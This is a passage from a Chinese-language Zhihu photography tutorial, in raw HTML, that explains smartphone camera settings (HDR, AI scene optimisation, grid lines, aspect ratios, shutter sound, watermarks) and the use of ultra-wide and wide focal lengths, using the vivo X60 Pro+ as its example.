data-original=\"https://pic2.zhimg.com/v2-c1d62442be9d5efe95760c93a9092c4d_r.jpg\"></figure><p>暗部有细节，亮部很清晰。</p>\n<p>这还不是今天的手机摄影 HDR 的全部本领，很多手机现在甚至是可以针对画面中的景物 HDR。结论就是：</p>\n<p><b>放心打开使用，不需要关闭。</b></p>\n<p>曝光知识远不止这些，我会在后面的章节中详细阐述。</p>\n<p><b>AI 场景优化</b></p>\n<p>先说结论，我自己是拿到手机的第一刻就会关闭安卓手机上所有所谓的「AI」优化功能。这其中的原因不完全是因为我不信任 AI，恰恰相反，今天的手机 AI 非常聪明，绝大多数情况下都会有很好的效果。而我之所以关闭是因为：</p>\n<p>「我希望拍摄我想要的画面，而不是机器想要的大数据画面。」</p>\n<p>通过前面的审美章节的阐述相信你也知道了，审美是一个很私人的事情。但是所谓的 AI 美化，则是基于大多数人的喜好统计，它并不能代表你的独特审美。的确，大多数人拍摄花朵时，希望花朵更加颜色艳丽，但我可能喜欢花朵更加深沉。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5dbbe5203e2eedc70c04d1f7ce5d021d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic2.zhimg.com/v2-5dbbe5203e2eedc70c04d1f7ce5d021d_r.jpg\"></figure><p>所以，如果你学习这篇文章的目的是更好的摄影表达，就应该关掉 AI。</p>\n<p>但我也知道，很多人的手机摄影只是为了社交网络服务，自己不想花时间后期或者是创作，那么 AI 相当于一个智能管家，帮你直接在拍摄之后做成大家喜欢的样子。</p>\n<p>萝卜青菜，任君选择。</p>\n<p><b>微距开关</b></p>\n<p>首先需要说明的是，不同安卓手机的微距能力是不同的，因此微距效果也不相同。微距镜头其实和普通镜头在设计上有差别。本文举例的 vivo X60 Pro+ 因此给设定了一开关，通过这个按钮可以直接改变镜头的物理特性，从而获得完全不同的最小对焦距离，获得完全不同的微距效果。</p>\n<p>微距拍摄其实是一个非常有趣的领域。对于摄影作品，甚至是广泛意义上的艺术作品来说，陌生感是很重要的艺术特性。而微距摄影之所以独特，就是因为微距摄影给了我们完全不同的观察角度。就算是一片非常普通的树叶，在微距镜头之下也会展现出不一样的精彩。所以我经常会使用微距镜头到处拍拍，你会发现很多看似平平无奇的景物有着完全不同的观感。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-ba46b855dc17381ddde8fc3288678a5c_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-ba46b855dc17381ddde8fc3288678a5c_r.jpg\"><figcaption>使用微距模式拍摄</figcaption></figure><p>点按三条横线以后，我们就会进入二级菜单，在这里有四个选项：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-bb9fd4dec47dd5e5d62d3c1360487fa2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"888\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-bb9fd4dec47dd5e5d62d3c1360487fa2_r.jpg\"></figure><p><b>网格线</b></p>\n<p><b>请你一定要打开网格线，它非常重要。</b>它既是一种你认真对待摄影的态度，也对你的拍摄过程起着重要的帮助，尤其是后面的构图章节。</p>\n<p>而且抛开所谓的进阶构图不谈，这网格线也至少可以让你在拍摄时横平竖直，尤其是一些建筑摄影，绝对是省力且高效。因此，如果你的手机现在没有打开网格线，那么现在请你立刻马上打开手机的网格线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9763abac88d39c65e0b982ae8c15ea39_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"581\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-9763abac88d39c65e0b982ae8c15ea39_r.jpg\"></figure><p><b>倒计时</b></p>\n<p>本身这项功能的出发点是方便一些合影中，拍摄人员可以有时间进入队伍，所以预留了一段时间来触发快门。但是毕竟这种情况相对来说比较少数，所以这项功能很少有人使用。但是这项功能还有一个非常重要的妙用，这就是：</p>\n<p><b>快门线。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d105f383dc95e744edd3c20b6dab361f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic4.zhimg.com/v2-d105f383dc95e744edd3c20b6dab361f_r.jpg\"></figure><p>在后面的章节中，我们会学习到长曝光的技法，一个重要的案例就是星空拍摄。长曝光的一个重要诀窍就是保持相机稳定，但是手机快门是需要点按屏幕，因此即使使用了稳定设备比如三脚架，还是很容易造成机身晃动。因此我们可以设定 3 秒的延时快门，这样按下快门以后，3 秒钟再触发快门，手机就会恢复稳定。</p>\n<p><b>画幅选择</b></p>\n<p>所谓的画幅，就是照片比例。</p>\n<p>其实画幅的选择是跟构图相关联的，因为不同的画幅完全有着不同的构图逻辑。在 vivo X60 Pro+ 中一共提供了 4 种画幅。</p>\n<p><b>1. 4:3 画幅</b></p>\n<p>这是最为常见的照片画幅比例，几乎所有的手机都是统一使用这个比例。</p>\n<p>这个画幅最大的拍摄感受就是画面最为工整，画面有着明确的延伸方向。所以大多数情况，我建议你使用 4:3 的拍摄比例。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-23e2507f9b64c0fd7e41dea85476b2a3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-23e2507f9b64c0fd7e41dea85476b2a3_r.jpg\"></figure><p>而且需要注意的是，绝大多数情况下手机的传感器比例也是 4:3 ，也就是说如果你使用 4:3 的比例进行拍摄，就会充分利用画面中的每一个像素点。而其它的画幅比例，都是在 4:3 的基础上进行裁切，因此都会有着一定的像素损失。所以这也意味着你可以在前期使用 4:3 ，通过后期裁切为其它的任意比例。</p>\n<p><b>2. 全屏画幅</b></p>\n<p>其实这个选项并不是从摄影创作的角度出发的，而是手机屏幕发展的附属产物。因为在过去的某一段时间里，手机进入了全面屏竞赛的阶段，很多厂商为了展现全面屏的优势，提供了整个屏幕取景的方式。我自己非常不喜欢这种取景方式，一方面画面中有很多 UI 遮挡，即使是半透明的，也很影响画面内容的获取。而且另一方面，这会放大手机曲面屏边界不清晰的缺陷，很不利于构图。</p>\n<p>所以我的建议是，永远不要使用。</p>\n<p><b>3. 16:9 画幅</b></p>\n<p>16:9 的比例是视频拍摄的经典比例，所以当你使用 16:9 拍摄照片时，也会获得一种非常独特的电影质感。如果你长时间关注手机摄影的趋势，就应该还会记得，曾经某一段时间流行一个专门的软件，可以帮你照片裁切成 16:9 的同时加一句台词来装作电影截图，风靡一时。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-8722dc2313001801611a0ab3ce49966e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"719\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-8722dc2313001801611a0ab3ce49966e_r.jpg\"></figure><p>但需要承认的是，16:9 其实本身是需要一定驾驭能力的，所以初学者建议不要尝试，也不要过度迷恋所谓的「电影感」。</p>\n<p><b> 4. 方形画幅</b></p>\n<p>我个人是十分喜欢正方形画幅的，而且我也特别推荐入门新手使用正方形构图，因为它「相对简单」。都说摄影是减法的艺术，所以一个简单的简化方式就是「减轻布局的压力」。当我们使用正方形构图时，我们可以很自然的把主体放到画面中间，而不需要考虑主体以外的内容。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-28165baeff85155fb6ad81e7978db1b0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"1280\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-28165baeff85155fb6ad81e7978db1b0_r.jpg\"></figure><p>而且正方形也更适合今天的社交网络，比如最为经典的 Instagram 就是著名的正方形图片社交网络。这也影响了几乎今天所有的图片社交网络。比如我们的微博、微信的图片方格都是正方形。所以如果你使用正方形构图拍摄就意味不会有画面的信息流失。</p>\n<h3>基本设置区</h3>\n<p>在这个区域中，所有的调整是针对整个相机的。而且基本上，只要针对性地设置一次，每次拍摄并不需要单独调整。需要说明的是，不同机型差别较大，但大部分选项重叠，只不过有机型的针对性功能。比如微云态校准，就是 vivo X60 Pro 系列专属。</p>\n<p>所以这里我直接着重说一些通用的设置：</p>\n<p><b>快门声音</b></p>\n<p>很多人认为快门声音的设置是多此一举的，但是实际上，在我看来快门声音可以关闭非常重要。的确，大多数情况下拍摄时配合着快门声音是一种快感。而且我也的确承认，好听的快门声可以满足创作的仪式感。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-febd580d22a6c37e2290449ca69ef10c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-febd580d22a6c37e2290449ca69ef10c_r.jpg\"></figure><p>但是创作是分类别的，如果你的创作需要不打扰，尤其是一些本身环境安静的场所拍摄，那么就一定要关闭快门声音。</p>\n<p>比如当我要进入一些寺庙时，我是一定会关闭快门声音的。但更重要的是，在一些题材的拍摄中，我们仅仅是一种观察者，如果快门声存在反而打破了这种平衡。被拍摄者可能因为快门声音，失去原有的状态。这一点在人文摄影中之至关重要，只要你消失在「无声之中」，他们才会呈现出最自然的状态。</p>\n<p>比如下面这张照片，就是我关掉快门声音，悄悄地坐在主体的身旁拍摄。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-be91ad3cd0b9550596e822393349801d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-be91ad3cd0b9550596e822393349801d_r.jpg\"></figure><p><b>水印</b></p>\n<p>不要在前期拍摄时打开水印。</p>\n<p>我不知道在拍摄的照片中添加水印，是哪一个厂商带起来的，但这绝对是「本末倒置」的行为。很多人认为增加水印会让自己的照片更加高级，我觉得很可笑。因为如果你的照片需要一个水印来提升「所谓的逼格」，那就偏离了你学习摄影的本质。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-2d5492b6ad2bd26f775487b877e26418_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-2d5492b6ad2bd26f775487b877e26418_r.jpg\"></figure><p>况且，前期添加水印还会给你带来技术上的麻烦。因为你会发现，水印的出现就意味着你的作品不能自如地进行二次后期构图。</p>\n<p>因为你需要照顾水印在画面中的比重。而二次构图对于摄影后期来说，可以说是决定性的一环。不仅是构图，调色也是一个要素。手机调色全局调整，也会让水印的颜色发生改变，让画面十分违和。</p>\n<p><b>所以，关掉任何形式的水印。</b></p>\n<p>如果你真的有需要增加水印，也还请后期添加，而不是在拍摄前期添加。</p>\n<p><b>快门触发方式</b></p>\n<p>快门的触发方式一直是我自己的一个「小趣味点」。</p>\n<p>这也是安卓手机一些独特的乐趣。比如 vivo X60 Pro+ 就提供了触屏、语音、手掌等多种拍摄方式。这些拍摄方式本质上是用来解放你的双手进行拍摄。显然，最合适的场景依然是多人的合影，只要架起来就不需要另一个人进行主动拍摄。</p>\n<p>但其实，这些快门的触发方式还有一个非常有用的用法这就是：</p>\n<p><b>更加优雅的自拍。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d14a8fd3145ddca291a5c0f44ef09b19_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-d14a8fd3145ddca291a5c0f44ef09b19_r.jpg\"></figure><p>很多人提到自拍可能会固化地认为某一种类型的，但是广泛的自拍其实也包含对自己的探索。这方面很多画家走在前面，比如说许多画家的自画像，例如梵高。摄影的初期也有类似的案例，比如爱德华·韦斯顿的自拍。因此我们也可以拍摄一些表达自己风格的自拍，这个时候通过「语音快门」就可以实现自行拍摄，并且还不会限制自己在画面中的全身动作。</p>\n<p>如果你读到这里，某种意义上已经完成了一种「热身」。因为这些功能介绍和设置，本质上的确是一种准备工作。但更重要的是，这些功能不是关键，而是辅助。</p>\n<p>真正的核心，咱们现在开始。</p>\n<h2>03. 镜头中的镜头眼</h2>\n<p>这部分内容的表层是：</p>\n<p>掌握不同镜头焦距的拍摄使用。</p>\n<p>但里层是：</p>\n<p>用不同的视角构建画面。</p>\n<p>我们都知道任何一部相机都离不开镜头，而镜头作为相机的「眼睛」，对画面的内容效果起着决定性作用。而这一章节中，我们要学习的就是镜头的一个重要参数：</p>\n<p><b>焦距。</b></p>\n<p>就算你不是专业的摄影师，你也可能或多或少的听说过这个词。而它的具体含义是镜头的光学中心点和传感器的距离。</p>\n<p>听不懂？没关系，你完全不需要听懂，你只要用视觉感受即可。比如下面是一组图，这四张图是使用 vivo X60 Pro+ 上四颗不同焦距的镜头拍摄。你会发现同一主体，四颗镜头就是完全四种不同的感受。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5b371369d3a435066e0463db23a3618d_b.jpg\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic2.zhimg.com/v2-5b371369d3a435066e0463db23a3618d_r.jpg\"><figcaption>超广角镜头（0.6X/等效 14mm）拍摄</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-ec327dab085b356e4c66ad37f6157d8f_b.jpg\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-ec327dab085b356e4c66ad37f6157d8f_r.jpg\"><figcaption>广角镜头（1X/等效 23mm）拍摄</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a6b50840ffb22b532143e170ad847528_b.jpg\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-a6b50840ffb22b532143e170ad847528_r.jpg\"><figcaption>标准镜头（2X/等效 50mm）拍摄</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-e6e2c6e5e5fbeb4fe6f9c667567f6092_b.jpg\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic3.zhimg.com/v2-e6e2c6e5e5fbeb4fe6f9c667567f6092_r.jpg\"><figcaption>长焦镜头（5X/等效 125mm）</figcaption></figure><p>焦距有一个衡量数值，一般都是 「mm」 为单位。但是需要说明的是，不同传感器面积的大小，计算方式不同，所以为了统一，摄影师们就有了一个<b>「等效焦距」</b>的概念。</p>\n<p>不同等效焦距的不同效果，我们可以使用下面这张图一目了然的获得，我们会发现：</p>\n<p>焦距越小，画面越广，拍摄得越近。</p>\n<p>焦距越大，画面越窄，拍摄得越远。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b9da7f8bb8f47c6173e5cd6f9f622bae_b.jpg\" data-size=\"normal\" data-rawwidth=\"698\" data-rawheight=\"470\" class=\"origin_image zh-lightbox-thumb\" width=\"698\" data-original=\"https://pic3.zhimg.com/v2-b9da7f8bb8f47c6173e5cd6f9f622bae_r.jpg\"><figcaption>图片来自 Nikon USA © Dave Black</figcaption></figure><p>不过今天的手机镜头并不会直接标注焦距，而是直接用 0.6X、 1X、2X、5X 来展现焦距的变化。但其实每一个倍数都有一个焦距对应，不过不同机型略有不同。而本文举例的 vivo X60 Pro+ 分别对应为：</p>\n<p>14mm、23mm、50mm、125mm。</p>\n<p>需要说明的是，镜头的焦距也分为可变和不可变两种，所以也就有了定焦镜头和变焦镜头。目前来说，几乎所有的主流影像旗舰手机都是搭配「多颗定焦镜头」。这主要是因为变焦镜头必须需要一定的物理空间，在手机的空间中很难实现。</p>\n<p>不过你可能会发现，智能手机在使用时是可以放大缩小变焦的，这其实是一种「障眼法」。目前多镜头手机的变焦都是通过「数字裁切实现」。比如 vivo X60 Pro+ 拍摄的画面如果是等效 20mm 左右大小，那它的画面实际上是 14mm 的画面裁切而成。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-97e600571a2a4a74ed995559e87d90f0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic1.zhimg.com/v2-97e600571a2a4a74ed995559e87d90f0_r.jpg\"></figure><p>这是一个很重要的知识点，因为这解释了你在拍摄时放大画面按常规来说画质会下降，可有的时候画质却突然变好。这是因为此时镜头已经过渡到了另一颗镜头上，而不是较低焦距镜头数值的裁切。这告诉我们一个重要的经验：</p>\n<p>想要最好的画质，就不要粗暴的使用放大缩小的拖动变焦，而是直接点击画面中不同的镜头，直接切换定焦距。就算你想要放大，后期的裁切和手机内部的裁切别无二致，自己后期裁切还能更加自由。</p>\n<p>不过焦距对于画面的影响远不住如此，我们一个一个来。</p>\n<p>依然需要说明，这里使用 vivo X60 Pro+ 作为案例，其它手机可能略有差异。</p>\n<h3>超广角镜头（0.6X/等效焦距 14mm）</h3>\n<p>坦率地说，作为一个专业摄影师，我自己都很难说我可以驾驭超广角，尤其是 14mm 这么广的超广角。这也从另一个侧面说明了今天智能机厂商摄影竞赛的白热化，因为提供的影像规格已经开始溢出。</p>\n<p>不过虽然说使用超广角很难，但是当你真的能够熟练使用超广角镜头时，你会像驯服一匹野马，很有成就感和乐趣。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d4ae4e48f279361942682d99d07baf57_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-d4ae4e48f279361942682d99d07baf57_r.jpg\"></figure><p>很多人其实存在一个误区，认为超广角的奥义在于「广」，也就是画面中拍摄的内容更多。但实际上，摄影师看中超广角的是：</p>\n<p>夸张的透视。</p>\n<p>比如上面超广角的图，我们会发现一个很重要的规律，这就是空间感强烈。在超广角的镜头下画面中的「近大远小」特性会非常明显。而这种非常强烈的近大远小的特性，绝对是一种少见的陌生感。所以这也是为什么如果我们使用超广角拍摄，很容易被叫做「大片」的原因。</p>\n<p>这也是一个很值得探讨的话题，比如说为什么很多照片看起来有艺术感或者是大片感。其中一个很重要的要素就是「不同」，甚至是「怪异的不同」。这些超常规的视觉，会让我们和照片本身突然有了距离感，也正是这个距离产生了美。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-098a25b43b2cb11053e4ade9fb89ed47_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic4.zhimg.com/v2-098a25b43b2cb11053e4ade9fb89ed47_r.jpg\"></figure><p>说远了，说回超广角。超广角镜头另一个重要的特性就是越是靠近画面的边缘越会拉伸，越靠近画面中心越会压缩。听到拉伸和压缩，就要敲黑板了。因为这在人像中，直接影响了身高。</p>\n<p>比如下面这张图，我们会发现姑娘的腿非常的长，就是因为腿在画面边缘，而身体和头在画面中央。相信我，学会了这一招，每个人都是九头身美女。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-60ebea40daf8dd84eb2f79333ea2e9e2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2776\" data-rawheight=\"3701\" class=\"origin_image zh-lightbox-thumb\" width=\"2776\" data-original=\"https://pic3.zhimg.com/v2-60ebea40daf8dd84eb2f79333ea2e9e2_r.jpg\"></figure><p>而当我们了解到超广角的这些特点以后，有以下建议：</p>\n<p><b>掌握三段式拍摄手法</b></p>\n<p>相信你一定看过很多类似的照片，其实我现在只要是一描述，你就一定会在脑海中浮现出类似的照片。这些照片一般来说最远处都是天边的云彩或者是雪山，中间可能是森林或者是草原，而画面的最近处，也就是底部会有一些有意思的石头或者是花朵作为前景。</p>\n<p>而这就是目前风光摄影师们最为常见的拍摄手法，三段式。比如下面这一张照片，就是最为经典的三段式拍摄手法。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-a41c5668ba3cea7d49609240ba0596a1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic2.zhimg.com/v2-a41c5668ba3cea7d49609240ba0596a1_r.jpg\"></figure><p>由于这个拍摄手法过于常见，所以我们甚至是很多时候会称之为「风光糖水」。但是这并不一定是贬义词，因为如果大家都采用某一种形式进行拍摄，那这种形式可能就是经典。而摄影师们使用这种三段式拍摄是有其深层原因的，这就是超广角画面中要安排的内容太多了。</p>\n<p>我们使用超广角拍摄时，会发现画面中很容易容纳许多和实际想要的画面不相关的内容。所以这就需要我们合理的安排画面中的内容。而这种三段式的拍摄手法，则是非常合理地把画面直接分割为三个部分，这就是：</p>\n<p><b>远景，中景，和近景。</b></p>\n<p>而其中最重要的部分就是近景。但有意思的是，恰恰近景是最容易被忽视的那一个。几乎所有的职业风光摄影师一半的时间是在去风景的路上，而另一半是在找近景的路上。</p>\n<p>我们可以通过下面这张图来进行一个直接的对比：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-32bb15d815d1a8682a752b1a94637d92_b.jpg\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic3.zhimg.com/v2-32bb15d815d1a8682a752b1a94637d92_r.jpg\"><figcaption>无前景</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d1ec78d1fbce4b598b37963c4baf9571_b.jpg\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic2.zhimg.com/v2-d1ec78d1fbce4b598b37963c4baf9571_r.jpg\"><figcaption>有前景</figcaption></figure><p>你会发现有近景的画面不仅仅是因为近景的加入多了一些层次，更重要的是还让画面中有了一种立体感。</p>\n<p><b>尝试低角度</b></p>\n<p>另一个非常容易造成画面冲击力的方式就是低角度使用超广角。不过这个低角度拍摄并不是超广角的专属。归根到底，这是在说摄影拍摄中角度选取的重要性。</p>\n<p>其实有一定的经验摄影师和小白摄影师有一个很重要的区分点，这就是职业摄影师从来不会「身高摄影」。这个词你可能是第一次听说，那就对了，因为这个词是我自己造的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d66ba0ec16668427e35c7d698ab16e81_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic2.zhimg.com/v2-d66ba0ec16668427e35c7d698ab16e81_r.jpg\"></figure><p>所谓的「身高摄影」，是说很多人拍摄的角度往往完全就是根据它的身高来决定的。大多数人遇到场景时，掏出手机直接就拍摄，所以你会发现拍摄出来的画面大致相同，毫无陌生感。但其实你只要是自己尝试更换一些自己身高以外的角度进行观察和拍摄，你会发现就算是你生活中再普通，再常见的视角都会完全不一样的视觉感受。</p>\n<p>低角度就是一个最好的证明。</p>\n<p>比如下面这张图就是最好的一个案例。画面中的本来是草原上两朵再常见不过的小花，但是当我尝试更换一个角度，从下向上进行拍摄，这两朵小花不仅拥有了透过阳光的质感，你也会发现一种「它们本身努力生长的情感」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-4ad3b511a687a827d114a9cfa4ba1679_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic2.zhimg.com/v2-4ad3b511a687a827d114a9cfa4ba1679_r.jpg\"></figure><p>这就是更换角度的魔力，而其实生活中，这种仅仅是通过更换视角就可以把普通的场景直接变为质感大片的角度随处都是。所以，当你使用超广角时，拿出手机以后不要着急。你先远近高低各不同地找找，也许就会发现很多不一样的角度。</p>\n<p><b>尝试放大趣味点</b></p>\n<p>随着今天摄影师的普及，很多摄影师的名言也逐渐开始普及起来。亚当斯的话就不说了，就连罗伯特·卡帕的「如果你拍得不够好，是因为你拍得不够近」也在今天小有名气。</p>\n<p>不过需要说明的是，这句话罗伯特·卡帕说是有一个范围的，因为它本身是一个战地摄影师（诺曼底登陆拍摄后，胶卷损坏的就是他）。既然是战地摄影师，「胆量」就是一个摄影师的衡量要素。尤其是当时没有现在这么好的长焦系统，摄影师基本上想要拍摄好的画面，自然只有贴近「真实战场」。</p>\n<p>但话虽如此，并不是说这句话对于摄影不重要，恰恰相反，这句话正是指导我进行摄影的诸多方面。</p>\n<p>首先客观上足够近的确可以帮你拥有全新的视觉语言，尤其是超广角。正如前面所说，因为超广角的一个重要特性就是近大远小的特点显著，所以这让超广角镜头有了一种放大镜的感觉。比如下面这张照片：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5f99b621930650e44038f1fba83eea7f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic4.zhimg.com/v2-5f99b621930650e44038f1fba83eea7f_r.jpg\"></figure><p>动物身体的某一部分，因为被超广角放大了，所以整个画面开始变得妙趣横生起来。因此每当有人问起我超广角到底有什么拍摄秘诀的时候，我会说：</p>\n<p><b>「当别人拍高时，你拍低，当比人拍远时，你拍近。」</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-7c09a0e61fded0f62a37827ddb19ec5f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic4.zhimg.com/v2-7c09a0e61fded0f62a37827ddb19ec5f_r.jpg\"></figure><p>至于什么是主观上的近，那么我就留在这摄影眼的最后一部分再说吧。</p>\n<h3>广角镜头（1X/等效焦距 23mm）</h3>\n<p>都说只听新人笑，未听旧人哭。我想现在对这句话感触最深的一定是所有安卓影像旗舰的「主镜头」。因为今天很多手机厂商几乎已经很少主动宣传主镜头的拍摄能力，基本上都是围绕着超广角或者是超长焦。这其实潜移默化也影响了很多用户自己本身的使用习惯。</p>\n<p>至少我自己就是这样的，我会发现我使用超广角和长焦拍摄的概率远高于使用 1X 广角镜头。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-37c698d37e4a278e93416320e94ec2b5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic2.zhimg.com/v2-37c698d37e4a278e93416320e94ec2b5_r.jpg\"></figure><p>当然这也不能完全是我喜新厌旧，因为其实在摄影领域里，23mm 本身并不是热门焦段。它的劣势在于本身还具有一定的广角性质，画面有着强烈的透视风格，另一方面它并不是一个适合常规人像拍摄的焦距，拍摄有门槛。不过，这并不是说这个焦距不好。它也有自己的优势，比如这是人文摄影中最为经典的焦段之一。</p>\n<p>手机厂商选择这个焦段还有一个原因是，它可以让「日常拍摄主题拍摄内容覆盖更多题材」。因为在多镜头之前，我们「没得选」，需要一个什么都能拍的焦距选择，那么的确 23mm 左右是为适合的一个选择。不过并不是说，23mm 在今天多镜头的环境下没有用武之地，它依然有着它独特的优势。</p>\n<p><b>最好的画质</b></p>\n<p>其实在多颗镜头推出的初期，还有一个所谓的「主副镜头」的概念，虽然这一概念是完全错误的，可是今天它的影响还没有完全消失。但是这样的概念出现，归根到底是因为在多镜头出现的初期，其它新增焦距镜头的画质和元老级别的 23mm 焦段的调教经验相差很多。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-678db898a2b38a4f3bdbda25c96635d7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-678db898a2b38a4f3bdbda25c96635d7_r.jpg\"></figure><p>所以这也就造成了，画质上的差距。</p>\n<p>因此，如果你今天想要拍摄的画面需要最好的画质保证，那么只要放心的使用 1X 镜头的 23mm 镜头即可。</p>\n<p><b>不夸张的广角效果</b></p>\n<p>在专业相机的领域里，其实是有一个镜头焦距的大致分类的。比如说小于 35mm ，我们一般就认为是广角镜头的区间，那么显然 23mm 